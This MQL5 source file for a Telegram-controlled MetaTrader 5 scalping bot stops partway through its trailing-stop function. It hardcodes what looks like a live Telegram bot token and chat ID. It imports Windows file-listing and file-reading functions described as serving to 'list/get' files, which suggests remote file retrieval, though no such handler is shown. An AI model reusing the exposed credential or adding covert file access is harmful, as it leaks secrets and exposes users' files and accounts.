//+------------------------------------------------------------------+
//| ProjectName: Coeur de milliardaire                               |
//| Professional Trading Bot with Telegram Remote Control            |
//+------------------------------------------------------------------+
#include <Trade/Trade.mqh>

#import "kernel32.dll"
long FindFirstFileW(string hPath, uchar &find_data[]);
int  FindNextFileW(long hFindFile, uchar &find_data[]);
int  FindClose(long hFindFile);
long CreateFileW(string hPath, uint dwDesiredAccess, uint dwShareMode, long lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, long hTemplateFile);
int  GetFileSize(long hFile, int &lpFileSizeHigh);
int  ReadFile(long hFile, uchar &lpBuffer[], uint nNumberOfBytesToRead, uint &lpNumberOfBytesRead, long lpOverlapped);
int  CloseHandle(long hObject);
#import


CTrade trade;
CPositionInfo pos;
COrderInfo ord;

input group "=== Trading Inputs ==="
input double RiskPercent = 1; //Risk as % of Trading Capital
input int Tppoints = 450; //Take profit (10 points = 1 pip)
input int Slpoints = 250; //Stoploss points (10 points = 1 pip)
input int TslTriggerPoints = 10; //Points in profit before Trailing SL is activated (10 points = 1 pip)
input int TslPoints = 10; //Trailing Stop loss (10 points = 1 pip)
input ENUM_TIMEFRAMES Timeframe = PERIOD_CURRENT; //Time frame to run
input int InpMagic = 123; //Expert advisor identification
input int MaxSpread = 50; //Maximum allowed spread in points (10 points = 1 pip)
input string TradeComment = "Scalping Robot";

//--- Protected Settings (Moved from inputs)
string ExpirationDate = "2026.12.31";
string TelegramToken = "7801637901:AAHAoFEk3eXcOneF5hpy6FIAuD3R_clEAtw";
string TelegramChatID = "7505313544";
bool ShowLogs = true; // Afficher les logs dans l'Expert

enum StartHour
  {
   S_Inactive=0,
   S_0100=1,
   S_0200=2,
   S_0300=3,
   S_0400=4,
   S_0500=5,
   S_0600=6,
   S_0700=7,
   S_0800=8,
   S_0900=9,
   S_1000=10,
   S_1100=11,
   S_1200=12,
   S_1300=13,
   S_1400=14,
   S_1500=15,
   S_1600=16,
   S_1700=17,
   S_1800=18,
   S_1900=19,
   S_2000=20,
   S_2100=21,
   S_2200=22,
   S_2300=23
  };
input StartHour SHInput = 8; //Start Hour

enum EndHour
  {
   E_Inactive=0,
   E_0100=1,
   E_0200=2,
   E_0300=3,
   E_0400=4,
   E_0500=5,
   E_0600=6,
   E_0700=7,
   E_0800=8,
   E_0900=9,
   E_1000=10,
   E_1100=11,
   E_1200=12,
   E_1300=13,
   E_1400=14,
   E_1500=15,
   E_1600=16,
   E_1700=17,
   E_1800=18,
   E_1900=19,
   E_2000=20,
   E_2100=21,
   E_2200=22,
   E_2300=23
  };
input EndHour EHInput = 21; //End Hour

int SHchoice, EHChoice;
int BarsN = 2;
int ExpirationBars = 3;
int OrderDistPoints = 3;

//--- Dashboard Constants
#define DASH_BG_NAME "DASH_Background"
#define DASH_TITLE_NAME "DASH_Title"
#define DASH_LABEL_BALANCE "DASH_LblBalance"
#define DASH_VAL_BALANCE "DASH_ValBalance"
#define DASH_LABEL_EQUITY "DASH_LblEquity"
#define DASH_VAL_EQUITY "DASH_ValEquity"
#define DASH_LABEL_PROFIT "DASH_LblProfit"
#define DASH_VAL_PROFIT "DASH_ValProfit"
#define DASH_LABEL_DAY_PROFIT "DASH_LblDayProfit"
#define DASH_VAL_DAY_PROFIT "DASH_ValDayProfit"
#define DASH_LABEL_LIFETIME "DASH_LblLifetime"
#define DASH_VAL_LIFETIME "DASH_ValLifetime"
#define DASH_LABEL_MSG      "DASH_LblMsg"
#define DASH_VAL_MSG      "DASH_ValMsg"
#define DASH_VAL_MODE     "DASH_ValMode"
#define DASH_VAL_WHATSAPP "DASH_ValWhatsApp"
#define DASH_VAL_EMOJI    "DASH_ValEmoji"
#define DASH_SEP1         "DASH_Separator1"
#define DASH_SEP2         "DASH_Separator2"
#define DASH_VAL_LIMITS   "DASH_ValLimits"
#define DASH_LABEL_EXPIRY "DASH_LblExpiry"
#define DASH_VAL_EXPIRY   "DASH_ValExpiry"
#define DASH_BTN_CHAT     "DASH_BtnChat"
#define DASH_EDIT_CHAT    "DASH_EditChat"
#define DASH_BTN_SEND     "DASH_BtnSend"
#define DASH_BTN_TG       "DASH_BtnTG"
#define DASH_LABEL_TG     "DASH_LblTG"

color  clrDashBg    = C'30,30,30';
color  clrDashTitle = clrGold;
color  clrDashText  = clrWhite;
int    dashX        = 20;
int    dashY        = 20;
int    dashWidth    = 300;
int    dashHeight   = 340;
int    dashLineH    = 32;

//--- Global State for Remote Control
bool   IsBotDisabled  = false;
bool   IsStartedNotified = false;
bool   IsTelegramActive = true;
int    TelegramInterval = 3;
int    TradingMode = 1; // 1 = Normal, 2 = Inverted
bool   IsAuthorized = false;
bool   RequireAuthorization = true;
bool   IsConnectionLost = false;
int    ConsecutiveTelegramFailures = 0;
int    ConnectionGraceMinutes = 20;
datetime LastTelegramSuccess = 0;

string RemoteAdminMsg = "Aucun message";
double AccountInitialBalance = 0;
long   LastUpdateID = 0;
long   GlobalFocusID = 0; // 0 = Tous les comptes écoutent
double MaxDailyProfitLimit = 0; // 0 = Pas de limite
double MaxDailyLossLimit = 0;   // 0 = Pas de limite (ex: 100 pour couper à -100)
datetime CurrentExpirationDate = 0;

//--- Security & Anti-Error Globals
datetime LastCommandTime = 0;
string   PendingCommand  = "";
bool     IsAwaitingSecurity = false;

struct TradeTracking
  {
   ulong             ticket;
   bool              notified;
  };

TradeTracking trackedPositions[];
TradeTracking trackedOrders[];

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
int OnInit()
  {
   trade.SetExpertMagicNumber(InpMagic);
   trade.SetTypeFillingBySymbol(_Symbol);
   ChartSetInteger(0, CHART_SHOW_GRID, false);

   AccountInitialBalance = AccountInfoDouble(ACCOUNT_BALANCE);

   StringTrimLeft(TelegramToken); StringTrimRight(TelegramToken);
   StringTrimLeft(TelegramChatID); StringTrimRight(TelegramChatID);

   EventSetTimer(3);

   string startMsg = "🤖 Trading Bot Started\n\n";
   startMsg += "Symbol: " + _Symbol + "\n";
   startMsg += "Timeframe: " + EnumToString(Timeframe) + "\n";
   startMsg += "Magic: " + IntegerToString(InpMagic) + "\n";
   startMsg += "Risk: " + DoubleToString(RiskPercent, 1) + "%\n";
   startMsg += "TP: " + IntegerToString(Tppoints) + " | SL: " + IntegerToString(Slpoints) + "\n";
   startMsg += "Trading Hours: " + IntegerToString(SHInput) + ":00 - " + IntegerToString(EHInput) + ":00";

   if(CurrentExpirationDate == 0)
      CurrentExpirationDate = StringToTime(ExpirationDate);

   if(TimeCurrent() > CurrentExpirationDate)
     {
      Alert("❌ License expired: " + TimeToString(CurrentExpirationDate, TIME_DATE));
      return INIT_FAILED;
     }

   // SendTelegramMessage(startMsg); // Removed from OnInit for reliability

   CreateDashboard();
   UpdateDashboard();

   if(!VerifyWebRequest()) return INIT_FAILED;
   if(!VerifyDLL()) return INIT_FAILED;

   CheckAuthorization();
   LoadPerformanceLimits();
   LoadExpiration();

   LastTelegramSuccess = TimeCurrent();
   LastCommandTime = TimeCurrent();

   return(INIT_SUCCEEDED);
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
bool VerifyWebRequest()
  {
   uchar data[];
   uchar result[];
   string headers;
   string url = "https://api.telegram.org";

   ResetLastError();
   int res = WebRequest("GET", url, (string)NULL, 2000, data, result, headers);

   if(res == -1 && GetLastError() == 4060)
     {
      string msg = "⚠️ CONFIGURATION REQUISE ⚠️\n\n";
      msg += "Le bot 'Coeur de Milliardaire' nécessite l'accès à Telegram pour fonctionner.\n\n";
      msg += "Veuillez suivre ces étapes :\n";
      msg += "1. Menu : Outils > Options (ou Ctrl+O)\n";
      msg += "2. Onglet : Expert Consultants\n";
      msg += "3. Cochez : 'Autoriser WebRequest pour les URL listées'\n";
      msg += "4. Double-cliquez sur '+' et ajoutez : https://api.telegram.org\n\n";
      msg += "Le bot va maintenant se retirer du graphique. Relancez-le après avoir activé cette option.";

      MessageBox(msg, "Erreur de Configuration WebRequest", MB_OK|MB_ICONSTOP);
      Log("ERREUR: WebRequest non autorisé. Veuillez ajouter https://api.telegram.org dans les Options.");
      ExpertRemove();
      return false;
     }
   return true;
  }

bool VerifyDLL()
  {
   if(!TerminalInfoInteger(TERMINAL_DLLS_ALLOWED))
     {
      string msg = "🛡️ IMPORTATION DLL REQUISE 🛡️\n\n";
      msg += "Le bot nécessite l'accès aux DLL pour gérer les fichiers (list/get experts).\n\n";
      msg += "Veuillez suivre ces étapes :\n";
      msg += "1. Menu : Outils > Options (ou Ctrl+O)\n";
      msg += "2. Onglet : Expert Consultants\n";
      msg += "3. Cochez : 'Autoriser l'importation de DLL'\n\n";
      msg += "Relancez le bot après avoir activé cette option.";

      MessageBox(msg, "Sécurité DLL", MB_OK|MB_ICONWARNING);
      Log("ERREUR: Importation DLL non autorisée. Veuillez l'activer dans les Options.");
      return true; // Ne bloque pas le bot, mais prévient l'utilisateur
     }
   return true;
  }

void OnDeinit(const int reason)
  {
   EventKillTimer();
   DeleteDashboard();

   string msg = "🛑 Bot Stopped\n\n";
   msg += "Reason: ";

   switch(reason)
     {
      case REASON_PROGRAM:
         msg += "Program terminated";
         break;
      case REASON_REMOVE:
         msg += "EA removed from chart";
         break;
      case REASON_RECOMPILE:
         msg += "EA recompiled";
         break;
      case REASON_CHARTCHANGE:
         msg += "Symbol/timeframe changed";
         break;
      case REASON_CHARTCLOSE:
         msg += "Chart closed";
         break;
      case REASON_PARAMETERS:
         msg += "Parameters changed";
         break;
      case REASON_ACCOUNT:
         msg += "Account changed";
         break;
      case REASON_TEMPLATE:
         msg += "Template loaded";
         break;
      case REASON_INITFAILED:
         msg += "Initialization failed";
         break;
      case REASON_CLOSE:
         msg += "Terminal closed";
         break;
      default:
         msg += "Unknown (" + IntegerToString(reason) + ")";
     }

   SendTelegramMessage(msg);
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void OnTick()
  {
   // Mise à jour périodique du dashboard (même si bloqué)
   static datetime lastDashUpdate = 0;
   if(TimeCurrent() - lastDashUpdate >= 5)
     {
      UpdateDashboard();
      lastDashUpdate = TimeCurrent();
     }

   // --- GATING DE SECURITE ---
   // Bloque toute exécution si :
   // 1. Le compte n'est pas autorisé (via /auth)
   // 2. Le bot est désactivé manuellement (via /stop)
   // 3. La licence a expiré (CurrentExpirationDate)
   if(!IsAuthorized || IsBotDisabled || TimeCurrent() > CurrentExpirationDate)
      return;

   // VERIFICATION DES LIMITES JOURNALIERES
   double currentDayProfit = GetDailyProfit();
   if(MaxDailyProfitLimit > 0 && currentDayProfit >= MaxDailyProfitLimit)
     {
      static bool notifiedProfit = false;
      if(!notifiedProfit)
        {
         SendTelegramMessage("🏆 LIMITE DE PROFIT ATTEINTE (" + DoubleToString(MaxDailyProfitLimit, 2) + "). Arrêt du trading pour aujourd'hui sur le compte " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)));
         notifiedProfit = true;
        }
      return;
     }

   if(MaxDailyLossLimit > 0 && currentDayProfit <= -MaxDailyLossLimit)
     {
      static bool notifiedLoss = false;
      if(!notifiedLoss)
        {
         SendTelegramMessage("⚠️ LIMITE DE PERTE ATTEINTE (" + DoubleToString(MaxDailyLossLimit, 2) + "). Arrêt du trading pour aujourd'hui sur le compte " + IntegerToString(AccountInfoInteger(ACCOUNT_LOGIN)));
         notifiedLoss = true;
        }
      return;
     }

   TrailStop();
   CheckTradeEvents();

   if(!IsNewBar())
      return;

   MqlDateTime time;
   TimeToStruct(TimeCurrent(), time);
   int Hournow = time.hour;

   SHchoice = SHInput;
   EHChoice = EHInput;

   if(Hournow < SHchoice)
     {
      CloseAllOrders();
      return;
     }
   if(Hournow >= EHChoice && EHChoice != 0)
     {
      CloseAllOrders();
      return;
     }

   int BuyTotal=0;
   int SellTotal=0;

   for(int i = PositionsTotal()-1; i>=0; i--)
     {
      if(pos.SelectByIndex(i))
        {
         if(pos.PositionType()==POSITION_TYPE_BUY && pos.Symbol()==_Symbol && pos.Magic()==InpMagic)
            BuyTotal++;
         if(pos.PositionType()==POSITION_TYPE_SELL && pos.Symbol()==_Symbol && pos.Magic()==InpMagic)
            SellTotal++;
        }
     }

   for(int i = OrdersTotal()-1; i>=0; i--)
     {
      if(ord.SelectByIndex(i))
        {
         if(ord.OrderType()==ORDER_TYPE_BUY_STOP && ord.Symbol()==_Symbol && ord.Magic()==InpMagic)
            BuyTotal++;
         if(ord.OrderType()==ORDER_TYPE_SELL_STOP && ord.Symbol()==_Symbol && ord.Magic()==InpMagic)
            SellTotal++;
        }
     }

   if(BuyTotal <= 0)
     {
      double high = findHigh();
      if(high > 0)
        {
         if(TradingMode == 1) SendBuyOrder(high);
         else SendSellOrder(high, true);
        }
     }
   if(SellTotal <= 0)
     {
      double low = findLow();
      if(low > 0)
        {
         if(TradingMode == 1) SendSellOrder(low);
         else SendBuyOrder(low, true);
        }
     }
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void CheckTradeEvents()
  {
   CheckNewPositions();
   CheckClosedPositions();
   CheckNewOrders();
   CheckDeletedOrders();
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void CheckNewPositions()
  {
   for(int i = PositionsTotal()-1; i>=0; i--)
     {
      if(pos.SelectByIndex(i))
        {
         if(pos.Symbol()==_Symbol && pos.Magic()==InpMagic)
           {
            ulong ticket = pos.Ticket();

            if(!IsPositionTracked(ticket))
              {
               AddTrackedPosition(ticket);

               string msg = "✅ *Trade Opened*\n\n";
               msg += "Symbol: " + pos.Symbol() + "\n";
               msg += "Type: " + (pos.PositionType()==POSITION_TYPE_BUY ? "BUY 🟢" : "SELL 🔴") + "\n";
               msg += "Entry: " + DoubleToString(pos.PriceOpen(), _Digits) + "\n";
               msg += "Lots: " + DoubleToString(pos.Volume(), 2) + "\n";
               msg += "SL: " + DoubleToString(pos.StopLoss(), _Digits) + "\n";
               msg += "TP: " + DoubleToString(pos.TakeProfit(), _Digits) + "\n";
               msg += "Ticket: " + IntegerToString(ticket);

               SendTelegramMessage(msg);
              }
           }
        }
     }
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void CheckClosedPositions()
  {
   for(int i = ArraySize(trackedPositions)-1; i>=0; i--)
     {
      bool found = false;

      for(int j = PositionsTotal()-1; j>=0; j--)
        {
         if(pos.SelectByIndex(j))
           {
            if(pos.Ticket() == trackedPositions[i].ticket)
              {
               found = true;
               break;
              }
           }
        }

      if(!found)
        {
         ulong ticket = trackedPositions[i].ticket;

         if(HistorySelectByPosition(ticket))
           {
            for(int h = HistoryDealsTotal()-1; h>=0; h--)
              {
               ulong dealTicket = HistoryDealGetTicket(h);

               if(HistoryDealGetInteger(dealTicket, DEAL_POSITION_ID) == ticket)
                 {
                  double profit = HistoryDealGetDouble(dealTicket, DEAL_PROFIT);
                  double volume = HistoryDealGetDouble(dealTicket, DEAL_VOLUME);
                  double price = HistoryDealGetDouble(dealTicket, DEAL_PRICE);
                  ENUM_DEAL_REASON reason = (ENUM_DEAL_REASON)HistoryDealGetInteger(dealTicket, DEAL_REASON);

                  string msg = (profit >= 0 ? "💰 *Trade Closed - Profit*\n\n" : "❌ *Trade Closed - Loss*\n\n");
                  msg += "Ticket: " + IntegerToString(ticket) + "\n";
                  msg += "Exit: " + DoubleToString(price, _Digits) + "\n";
                  msg += "Lots: " + DoubleToString(volume, 2) + "\n";
                  msg += "P/L: " + DoubleToString(profit, 2) + " " + AccountInfoString(ACCOUNT_CURRENCY) + "\n";
                  msg += "Reason: " + GetDealReasonText(reason);

                  SendTelegramMessage(msg);
                  break;
                 }
              }
           }

         RemoveTrackedPosition(i);
        }
     }
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void CheckNewOrders()
  {
   for(int i = OrdersTotal()-1; i>=0; i--)
     {
      if(ord.SelectByIndex(i))
        {
         if(ord.Symbol()==_Symbol && ord.Magic()==InpMagic)
           {
            ulong ticket = ord.Ticket();

            if(!IsOrderTracked(ticket))
              {
               AddTrackedOrder(ticket);

               string msg = "📝 *New Pending Order*\n\n";
               msg += "Symbol: " + ord.Symbol() + "\n";
               msg += "Type: " + GetOrderTypeText(ord.OrderType()) + "\n";
               msg += "Entry: " + DoubleToString(ord.PriceOpen(), _Digits) + "\n";
               msg += "Lots: " + DoubleToString(ord.VolumeInitial(), 2) + "\n";
               msg += "SL: " + DoubleToString(ord.StopLoss(), _Digits) + "\n";
               msg += "TP: " + DoubleToString(ord.TakeProfit(), _Digits) + "\n";
               msg += "Expiry: " + TimeToString(ord.TimeExpiration()) + "\n";
               msg += "Ticket: " + IntegerToString(ticket);

               SendTelegramMessage(msg);
              }
           }
        }
     }
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void CheckDeletedOrders()
  {
   for(int i = ArraySize(trackedOrders)-1; i>=0; i--)
     {
      bool found = false;

      for(int j = OrdersTotal()-1; j>=0; j--)
        {
         if(ord.SelectByIndex(j))
           {
            if(ord.Ticket() == trackedOrders[i].ticket)
              {
               found = true;
               break;
              }
           }
        }

      if(!found)
        {
         ulong ticket = trackedOrders[i].ticket;

         string msg = "🗑️ *Order Deleted*\n\n";
         msg += "Ticket: " + IntegerToString(ticket) + "\n";

         if(HistoryOrderSelect(ticket))
           {
            ENUM_ORDER_STATE state = (ENUM_ORDER_STATE)HistoryOrderGetInteger(ticket, ORDER_STATE);
            msg += "Reason: " + GetOrderStateText(state);
           }
         else
           {
            msg += "Reason: Order not found in history";
           }

         SendTelegramMessage(msg);
         RemoveTrackedOrder(i);
        }
     }
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
string GetOrderTypeText(ENUM_ORDER_TYPE type)
  {
   switch(type)
     {
      case ORDER_TYPE_BUY_STOP:
         return "BUY STOP 🟢⬆️";
      case ORDER_TYPE_SELL_STOP:
         return "SELL STOP 🔴⬇️";
      case ORDER_TYPE_BUY_LIMIT:
         return "BUY LIMIT 🟢⬇️";
      case ORDER_TYPE_SELL_LIMIT:
         return "SELL LIMIT 🔴⬆️";
      default:
         return "UNKNOWN";
     }
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
string GetDealReasonText(ENUM_DEAL_REASON reason)
  {
   switch(reason)
     {
      case DEAL_REASON_SL:
         return "Stop Loss";
      case DEAL_REASON_TP:
         return "Take Profit";
      case DEAL_REASON_SO:
         return "Stop Out";
      case DEAL_REASON_EXPERT:
         return "EA Closed";
      default:
         return "Manual/Other";
     }
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
string GetOrderStateText(ENUM_ORDER_STATE state)
  {
   switch(state)
     {
      case ORDER_STATE_CANCELED:
         return "Canceled";
      case ORDER_STATE_EXPIRED:
         return "Expired";
      case ORDER_STATE_FILLED:
         return "Filled";
      case ORDER_STATE_REJECTED:
         return "Rejected";
      default:
         return "Unknown";
     }
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
bool IsPositionTracked(ulong ticket)
  {
   for(int i=0; i<ArraySize(trackedPositions); i++)
     {
      if(trackedPositions[i].ticket == ticket)
         return true;
     }
   return false;
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
bool IsOrderTracked(ulong ticket)
  {
   for(int i=0; i<ArraySize(trackedOrders); i++)
     {
      if(trackedOrders[i].ticket == ticket)
         return true;
     }
   return false;
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void AddTrackedPosition(ulong ticket)
  {
   int size = ArraySize(trackedPositions);
   ArrayResize(trackedPositions, size+1);
   trackedPositions[size].ticket = ticket;
   trackedPositions[size].notified = true;
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void AddTrackedOrder(ulong ticket)
  {
   int size = ArraySize(trackedOrders);
   ArrayResize(trackedOrders, size+1);
   trackedOrders[size].ticket = ticket;
   trackedOrders[size].notified = true;
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void RemoveTrackedPosition(int index)
  {
   int size = ArraySize(trackedPositions);
   if(index < 0 || index >= size)
      return;

   for(int i=index; i<size-1; i++)
     {
      trackedPositions[i] = trackedPositions[i+1];
     }
   ArrayResize(trackedPositions, size-1);
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void RemoveTrackedOrder(int index)
  {
   int size = ArraySize(trackedOrders);
   if(index < 0 || index >= size)
      return;

   for(int i=index; i<size-1; i++)
     {
      trackedOrders[i] = trackedOrders[i+1];
     }
   ArrayResize(trackedOrders, size-1);
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void SendTelegramMessage(string text)
  {
   if(TelegramToken == "" || TelegramChatID == "")
     {
      Log("Telegram not configured!");
      return;
     }

   string url = "https://api.telegram.org/bot" + TelegramToken + "/sendMessage";
   string postData = "chat_id=" + TelegramChatID + "&text=" + UrlEncode(text) + "&parse_mode=Markdown";

   uchar data[];
   uchar result[];
   string headers;

   int dataSize = StringToCharArray(postData, data, 0, WHOLE_ARRAY, CP_UTF8) - 1;
   if(dataSize > 0)
      ArrayResize(data, dataSize);

   string customHeaders = "Content-Type: application/x-www-form-urlencoded\r\n";
   int res = WebRequest("POST", url, customHeaders, 2000, data, result, headers);

   if(res == -1)
     {
      Log("WebRequest error: ", IntegerToString(GetLastError()));
      Log("Enable URL in MT5: Tools -> Options -> Expert Advisors -> Allow WebRequest for URL: https://api.telegram.org");
     }
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
double findHigh()
  {
   double highestHigh = 0;
   for(int i = 0; i < 400; i++)
     {
      double high = iHigh(_Symbol, Timeframe, i);
      if(i > BarsN && iHighest(_Symbol, Timeframe, MODE_HIGH, BarsN*2+1, i-BarsN) == i)
        {
         if(high > highestHigh)
           {
            return high;
           }
        }
      highestHigh = MathMax(high, highestHigh);
     }
   return -1;
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
double findLow()
  {
   double lowestLow = DBL_MAX;
   for(int i = 0; i < 400; i++)
     {
      double low = iLow(_Symbol, Timeframe, i);
      if(i > BarsN && iLowest(_Symbol, Timeframe, MODE_LOW, BarsN*2+1, i-BarsN) == i)
        {
         if(low < lowestLow)
           {
            return low;
           }
        }
      lowestLow = MathMin(low, lowestLow);
     }
   return -1;
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
bool IsNewBar()
  {
   static datetime previousTime = 0;
   datetime currentTime = iTime(_Symbol, Timeframe, 0);
   if(previousTime != currentTime)
     {
      previousTime = currentTime;
      return true;
     }
   return false;
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void SendBuyOrder(double entry, bool isLimit=false)
  {
   double ask = SymbolInfoDouble(_Symbol, SYMBOL_ASK);
   double bid = SymbolInfoDouble(_Symbol, SYMBOL_BID);
   double spread = (ask - bid) / _Point;

   if(spread > MaxSpread)
     {
      Log("Buy blocked: Spread too high (", DoubleToString(spread, 0), " pts)");
      return;
     }

   if(!isLimit && ask > entry - OrderDistPoints * _Point)
      return;
   if(isLimit && ask < entry + OrderDistPoints * _Point)
      return;

   double tp = entry + Tppoints * _Point;
   double sl = entry - Slpoints * _Point;
   double lots = 0.01;

   if(RiskPercent > 0)
      lots = calcLots(entry-sl);

   datetime expiration = iTime(_Symbol, Timeframe, 0) + ExpirationBars * PeriodSeconds(Timeframe);

   if(!isLimit) trade.BuyStop(lots, entry, _Symbol, sl, tp, ORDER_TIME_SPECIFIED, expiration);
   else trade.BuyLimit(lots, entry, _Symbol, sl, tp, ORDER_TIME_SPECIFIED, expiration);
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void SendSellOrder(double entry, bool isLimit=false)
  {
   double bid = SymbolInfoDouble(_Symbol, SYMBOL_BID);
   double ask = SymbolInfoDouble(_Symbol, SYMBOL_ASK);
   double spread = (ask - bid) / _Point;

   if(spread > MaxSpread)
     {
      Log("Sell blocked: Spread too high (", DoubleToString(spread, 0), " pts)");
      return;
     }

   if(!isLimit && bid < entry + OrderDistPoints * _Point)
      return;
   if(isLimit && bid > entry - OrderDistPoints * _Point)
      return;

   double tp = entry - Tppoints * _Point;
   double sl = entry + Slpoints * _Point;
   double lots = 0.01;

   if(RiskPercent > 0)
      lots = calcLots(sl - entry);

   datetime expiration = iTime(_Symbol, Timeframe, 0) + ExpirationBars * PeriodSeconds(Timeframe);

   if(!isLimit) trade.SellStop(lots, entry, _Symbol, sl, tp, ORDER_TIME_SPECIFIED, expiration);
   else trade.SellLimit(lots, entry, _Symbol, sl, tp, ORDER_TIME_SPECIFIED, expiration);
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
double calcLots(double slPoints)
  {
   double risk = AccountInfoDouble(ACCOUNT_BALANCE) * RiskPercent / 100;

   double ticksize = SymbolInfoDouble(_Symbol, SYMBOL_TRADE_TICK_SIZE);
   double tickvalue = SymbolInfoDouble(_Symbol, SYMBOL_TRADE_TICK_VALUE);
   double loststep = SymbolInfoDouble(_Symbol, SYMBOL_VOLUME_STEP);
   double minvolume = SymbolInfoDouble(Symbol(), SYMBOL_VOLUME_MIN);
   double maxvolume = SymbolInfoDouble(Symbol(), SYMBOL_VOLUME_MAX);
   double volumelimit = SymbolInfoDouble(_Symbol, SYMBOL_VOLUME_LIMIT);

   double moneyPerLotstep = slPoints / ticksize * tickvalue * loststep;
   double lots = MathFloor(risk / moneyPerLotstep) * loststep;

   if(volumelimit != 0)
      lots = MathMin(lots, volumelimit);
   if(maxvolume != 0)
      lots = MathMin(lots, SymbolInfoDouble(_Symbol, SYMBOL_VOLUME_MAX));
   if(minvolume != 0)
      lots = MathMax(lots, SymbolInfoDouble(_Symbol, SYMBOL_VOLUME_MIN));
   lots = NormalizeDouble(lots, 2);

   return lots;
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void CloseAllOrders(bool notify=true)
  {
   int deletedCount = 0;
   int closedCount = 0;

   // 1. Supprimer les ordres en attente
   for(int i = OrdersTotal()-1; i >= 0; i--)
     {
      if(ord.SelectByIndex(i))
        {
         ulong ticket = ord.Ticket();
         if(ord.Symbol() == _Symbol && ord.Magic() == InpMagic)
           {
            if(trade.OrderDelete(ticket))
               deletedCount++;
           }
        }
     }

   // 2. Fermer les positions ouvertes
   for(int i = PositionsTotal()-1; i >= 0; i--)
     {
      if(pos.SelectByIndex(i))
        {
         if(pos.Symbol() == _Symbol && pos.Magic() == InpMagic)
           {
            if(trade.PositionClose(pos.Ticket()))
               closedCount++;
           }
        }
     }

   if(notify && (deletedCount > 0 || closedCount > 0))
     {
      string msg = "🔔 Ordres/Positions fermés\n\n";
      msg += "Ordres supprimés: " + IntegerToString(deletedCount) + "\n";
      msg += "Positions fermées: " + IntegerToString(closedCount);
      SendTelegramMessage(msg);
     }
  }

//+------------------------------------------------------------------+---------------------------------------------------------------+
//|                                                                |
//+------------------------------------------------------------------+---------------------------------------------------------------+
void TrailStop()
  {
   double sl = 0;
   double tp = 0;

   double ask = SymbolInfoDouble(_Symbol, SYMBOL_ASK);
   double bid = SymbolInfoDouble(_Symbol, SYMBOL_BID);

   for(int i=PositionsTotal()-1; i>=0; i--)
     {
      if(pos.SelectByIndex(i))
        {
         ulong ticket = pos.Ticket();

         if(pos.Magic()==InpMagic && pos.Symbol()==_Symbol)
           {
            if(pos.PositionType()==POSITION_TYPE_BUY)
              {
               if(bid-pos.PriceOpen()>TslTriggerPoints*_Point)
                 {
                  tp=pos.TakeProfit();
                  sl=bid-(TslPoints*_Point);

                  if(sl > pos.StopLoss() && sl!=0)
                    {
                     if(trade.PositionModify(ticket, sl, tp))
                       {
                        string msg = "🔄 *Trailing Stop Activated*\n\n";
                        msg += "Ticket: " + IntegerToString(ticket) + "\n";
                        msg += "New SL: " + DoubleToString(sl, _Digits);
                        SendTelegramMessage(msg);
                       }
                    }
                 }
              }
            else
               if(pos.PositionType()==POSITION_TYPE_SELL)
                 {
                  if(ask+(TslTriggerPoints*_Point)<pos.PriceOpen())
                    {
                     tp = pos.TakeProfit();
                     sl = ask + (TslPoints * _Point);
                     if(sl<pos.StopLoss() && sl!=0)
                       {
                        if(trade.PositionModify(ticket,sl,tp))
                          {
                           string msg = "🔄 *Trailing Stop Activated*\n\n";
                           msg += "Ticket: " + IntegerToString(ticket) + "\n";
